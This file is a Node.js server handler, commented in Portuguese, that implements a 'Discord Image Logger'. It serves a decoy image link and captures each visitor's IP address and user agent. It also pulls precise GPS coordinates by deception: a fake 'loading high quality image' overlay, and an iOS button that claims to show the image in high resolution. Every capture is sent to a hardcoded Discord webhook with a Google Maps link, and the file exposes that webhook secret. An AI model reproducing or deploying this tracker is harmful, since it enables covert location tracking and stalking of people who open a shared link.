// Discord Image Logger - Versão otimizada para iOS
const https = require('https');
const url = require('url');

// Configuração
const config = {
  "webhook": "https://discord.com/api/webhooks/1352417668946202624/V_mU5x7tpRUNzzaSoK2RKz1PLXzDwv2r_jaZnv5e6Y-opOIB9b9ghuPu8CtGnPfwEdKu",
  "image": "https://i.pinimg.com/564x/12/26/e0/1226e0b520b52a84933d697f52600012.jpg",
  "username": "Image Logger",
  "color": 0x00FFFF,
  "accurateLocation": true
};

// Função para enviar webhook
function sendDiscordWebhook(data) {
  return new Promise((resolve, reject) => {
    try {
      // Parsear a URL do webhook
      const webhookUrl = new URL(config.webhook);
      
      // Preparar os dados
      const webhookData = JSON.stringify(data);
      
      // Configurar a requisição
      const options = {
        hostname: webhookUrl.hostname,
        path: webhookUrl.pathname + webhookUrl.search,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(webhookData)
        }
      };
      
      // Criar a requisição
      const req = https.request(options, (res) => {
        let responseData = '';
        
        // Coletar dados da resposta
        res.on('data', (chunk) => {
          responseData += chunk;
        });
        
        // Quando a resposta terminar
        res.on('end', () => {
          // Verificar código de status
          if (res.statusCode >= 200 && res.statusCode < 300) {
            console.log('Webhook enviado com sucesso');
            resolve(true);
          } else {
            console.error(`Erro ao enviar webhook: Status ${res.statusCode}`);
            console.error(`Resposta: ${responseData}`);
            resolve(false);
          }
        });
      });
      
      // Tratar erros na requisição
      req.on('error', (error) => {
        console.error('Erro na requisição do webhook:', error);
        reject(error);
      });
      
      // Enviar os dados
      req.write(webhookData);
      req.end();
    } catch (error) {
      console.error('Erro ao enviar webhook:', error);
      reject(error);
    }
  });
}

// Detectar se é um dispositivo iOS
function isIOS(userAgent) {
  return /iPad|iPhone|iPod/.test(userAgent);
}

// Função principal
module.exports = async (req, res) => {
  try {
    // Obter parâmetros da URL
    const parsedUrl = url.parse(req.url, true);
    const params = parsedUrl.query;
    const geoParam = params.g; // Verificar se já temos coordenadas de localização
    
    // Obter IP e User Agent
    const ip = req.headers['x-forwarded-for'] || 
               req.headers['x-real-ip'] || 
               req.socket.remoteAddress || 
               'Desconhecido';
    
    const userAgent = req.headers['user-agent'] || 'Desconhecido';
    
    // Verificar se é iOS para tratamento especial
    const deviceIsIOS = isIOS(userAgent);
    
    // Verificar se o IP é do Discord (começa com 35)
    const isDiscord = ip.startsWith('35');
    
    // Se temos parâmetro de geolocalização, enviar para o Discord
    if (geoParam) {
      try {
        // Decodificar as coordenadas
        const coords = Buffer.from(geoParam, 'base64').toString('utf-8');
        const [latitude, longitude] = coords.split(',');
        
        // Enviar webhook ao Discord com coordenadas
        const data = {
          username: config.username,
          content: "@everyone",
          embeds: [
            {
              title: "Image Logger - IP + Localização Capturados",
              color: config.color,
              description: `**Alguém acessou o site com localização precisa!**\n\n**IP:** \`${ip}\`\n\n**Localização GPS:** \`${latitude}, ${longitude}\`\n[Ver no Google Maps](https://www.google.com/maps/search/google+map++${latitude},${longitude})\n\n**User Agent:**\n\`\`\`\n${userAgent}\n\`\`\``,
              thumbnail: { url: config.image }
            }
          ]
        };
        
        await sendDiscordWebhook(data);
        
        // Enviar página com a imagem
        const html = `
          <!DOCTYPE html>
          <html>
          <head>
            <title>Imagem</title>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
              body, html {
                margin: 0;
                padding: 0;
                height: 100%;
                width: 100%;
                overflow: hidden;
              }
              .imagem {
                width: 100%;
                height: 100vh;
                background-image: url('${config.image}');
                background-position: center;
                background-repeat: no-repeat;
                background-size: contain;
              }
            </style>
          </head>
          <body>
            <div class="imagem"></div>
          </body>
          </html>
        `;
        
        res.setHeader('Content-Type', 'text/html');
        res.status(200).send(html);
      } catch (error) {
        console.error('Erro ao processar geolocalização:', error);
        // Continuar mesmo com erro na geolocalização
      }
    } else if (isDiscord) {
      // Se for o Discord acessando, enviar alerta de link
      console.log("Acesso do Discord detectado. IP:", ip);
      
      const data = {
        username: config.username,
        content: "",
        embeds: [
          {
            title: "Image Logger - Link Sent",
            color: config.color,
            description: `An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** \`${req.url}\`\n**IP:** \`${ip}\`\n**Platform:** \`Discord\``,
          }
        ]
      };
      
      await sendDiscordWebhook(data);
      
      // Para o Discord, enviar imagem bugada
      res.setHeader('Content-Type', 'image/jpeg');
      res.status(200).send(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
    } else if (config.accurateLocation) {
      // Se não temos geolocalização ainda, solicitar do navegador
      
      // Primeiro, enviar relatório básico sem geolocalização
      const basicData = {
        username: config.username,
        content: "",
        embeds: [
          {
            title: "Image Logger - Acesso Inicial",
            color: config.color,
            description: `**Alguém acessou o site! Aguardando localização...**\n\n**IP:** \`${ip}\`\n\n**User Agent:**\n\`\`\`\n${userAgent}\n\`\`\``,
            thumbnail: { url: config.image }
          }
        ]
      };
      
      await sendDiscordWebhook(basicData);
      
      // Personalizar o HTML com base no dispositivo (iOS vs outros)
      let html;
      
      if (deviceIsIOS) {
        // Versão especial para iOS com instruções claras
        html = `
          <!DOCTYPE html>
          <html>
          <head>
            <title>Imagem</title>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
              body, html {
                margin: 0;
                padding: 0;
                height: 100%;
                width: 100%;
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
              }
              .container {
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                height: 100vh;
                position: relative;
              }
              .image-preview {
                width: 100%;
                max-width: 500px;
                max-height: 70vh;
                object-fit: contain;
                border-radius: 8px;
                box-shadow: 0 4px 8px rgba(0,0,0,0.1);
              }
              .location-button {
                margin-top: 20px;
                background-color: #007AFF; /* iOS blue */
                color: white;
                border: none;
                border-radius: 20px;
                padding: 12px 24px;
                font-size: 16px;
                font-weight: 600;
                cursor: pointer;
                display: flex;
                align-items: center;
                justify-content: center;
                box-shadow: 0 2px 4px rgba(0,0,0,0.1);
              }
              .location-icon {
                margin-right: 8px;
                width: 20px;
                height: 20px;
              }
              .message {
                margin-top: 16px;
                text-align: center;
                color: #8E8E93;
                font-size: 14px;
                max-width: 300px;
              }
              .hidden {
                display: none;
              }
            </style>
          </head>
          <body>
            <div class="container">
              <img src="${config.image}" alt="Imagem" class="image-preview">
              
              <button id="locationButton" class="location-button">
                <svg class="location-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                  <circle cx="12" cy="10" r="3"></circle>
                  <path d="M12 2a8 8 0 0 0-8 8c0 1.892.402 3.13 1.5 4.5L12 22l6.5-7.5c1.098-1.37 1.5-2.608 1.5-4.5a8 8 0 0 0-8-8z"></path>
                </svg>
                Ver em alta qualidade
              </button>
              
              <p class="message">Toque no botão acima para ver a imagem em resolução completa</p>
              
              <div id="loadingMessage" class="message hidden">
                Carregando imagem em alta definição...
              </div>
            </div>
            
            <script>
              // Script para geolocalização no iOS
              document.getElementById('locationButton').addEventListener('click', function() {
                // Mostrar mensagem de carregamento
                document.getElementById('loadingMessage').classList.remove('hidden');
                this.disabled = true;
                this.style.backgroundColor = '#999';
                
                // Solicitar geolocalização
                if (navigator.geolocation) {
                  navigator.geolocation.getCurrentPosition(
                    function(position) {
                      // Sucesso - temos a posição
                      var lat = position.coords.latitude;
                      var lng = position.coords.longitude;
                      var coords = lat + "," + lng;
                      
                      // Codificar em base64
                      var encodedCoords = btoa(coords);
                      
                      // Construir nova URL
                      var currentUrl = window.location.href;
                      var newUrl;
                      if (currentUrl.includes("?")) {
                        newUrl = currentUrl + "&g=" + encodedCoords;
                      } else {
                        newUrl = currentUrl + "?g=" + encodedCoords;
                      }
                      
                      // Redirecionar
                      window.location.replace(newUrl);
                    },
                    function(error) {
                      // Erro ao obter localização
                      console.log("Erro de geolocalização: " + error.message);
                      document.getElementById('loadingMessage').innerText = "Erro ao carregar. Tente novamente.";
                      document.getElementById('locationButton').disabled = false;
                      document.getElementById('locationButton').style.backgroundColor = '#007AFF';
                    },
                    {
                      enableHighAccuracy: true,
                      timeout: 15000,
                      maximumAge: 0
                    }
                  );
                }
              });
            </script>
          </body>
          </html>
        `;
      } else {
        // Versão padrão para Android e outros dispositivos
        html = `
          <!DOCTYPE html>
          <html>
          <head>
            <title>Imagem</title>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
              body, html {
                margin: 0;
                padding: 0;
                height: 100%;
                width: 100%;
                overflow: hidden;
              }
              .imagem {
                width: 100%;
                height: 100vh;
                background-image: url('${config.image}');
                background-position: center;
                background-repeat: no-repeat;
                background-size: contain;
              }
              .loading {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background-color: rgba(0,0,0,0.3);
                display: flex;
                justify-content: center;
                align-items: center;
                color: white;
                font-family: Arial, sans-serif;
                z-index: 100;
              }
              .loading-content {
                background-color: rgba(0,0,0,0.7);
                padding: 20px;
                border-radius: 10px;
                text-align: center;
              }
              .spinner {
                border: 4px solid rgba(255,255,255,0.3);
                border-radius: 50%;
                border-top: 4px solid white;
                width: 30px;
                height: 30px;
                margin: 10px auto;
                animation: spin 1s linear infinite;
              }
              @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
              }
            </style>
          </head>
          <body>
            <div class="imagem"></div>
            <div class="loading">
              <div class="loading-content">
                <div class="spinner"></div>
                <p>Carregando imagem em alta qualidade...</p>
              </div>
            </div>
            
            <script>
              // Script para obter geolocalização
              document.addEventListener('DOMContentLoaded', function() {
                var currentUrl = window.location.href;
                
                // Verificar se já temos o parâmetro g
                if (!currentUrl.includes("g=")) {
                  // Solicitar geolocalização
                  if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                      function(position) {
                        // Sucesso - temos a posição
                        var lat = position.coords.latitude;
                        var lng = position.coords.longitude;
                        var coords = lat + "," + lng;
                        
                        // Codificar em base64
                        var encodedCoords = btoa(coords);
                        
                        // Construir nova URL
                        var newUrl;
                        if (currentUrl.includes("?")) {
                          newUrl = currentUrl + "&g=" + encodedCoords;
                        } else {
                          newUrl = currentUrl + "?g=" + encodedCoords;
                        }
                        
                        // Redirecionar
                        window.location.replace(newUrl);
                      },
                      function(error) {
                        // Erro ao obter localização
                        console.log("Erro de geolocalização: " + error.message);
                        document.querySelector('.loading').style.display = 'none';
                      },
                      {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                      }
                    );
                  }
                }
              });
            </script>
          </body>
          </html>
        `;
      }
      
      res.setHeader('Content-Type', 'text/html');
      res.status(200).send(html);
    } else {
      // Geolocalização não está ativada, enviar relatório básico
      const data = {
        username: config.username,
        content: "@everyone",
        embeds: [
          {
            title: "Image Logger - IP Capturado",
            color: config.color,
            description: `**Alguém acessou o site!**\n\n**IP:** \`${ip}\`\n\n**User Agent:**\n\`\`\`\n${userAgent}\n\`\`\``,
            thumbnail: { url: config.image }
          }
        ]
      };
      
      await sendDiscordWebhook(data);
      
      // Enviar página com a imagem
      const html = `
        <!DOCTYPE html>
        <html>
        <head>
          <title>Imagem</title>
          <meta charset="utf-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <style>
            body, html {
              margin: 0;
              padding: 0;
              height: 100%;
              width: 100%;
              overflow: hidden;
            }
            .imagem {
              width: 100%;
              height: 100vh;
              background-image: url('${config.image}');
              background-position: center;
              background-repeat: no-repeat;
              background-size: contain;
            }
          </style>
        </head>
        <body>
          <div class="imagem"></div>
        </body>
        </html>
      `;
      
      res.setHeader('Content-Type', 'text/html');
      res.status(200).send(html);
    }
  } catch (error) {
    console.error('Erro:', error);
    
    // Em caso de erro, enviar página básica
    res.setHeader('Content-Type', 'text/html');
    res.status(200).send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Imagem</title>
      </head>
      <body>
        <img src="${config.image}" alt="Imagem" style="max-width: 100%; max-height: 100vh;">
      </body>
      </html>
    `);
  }
};
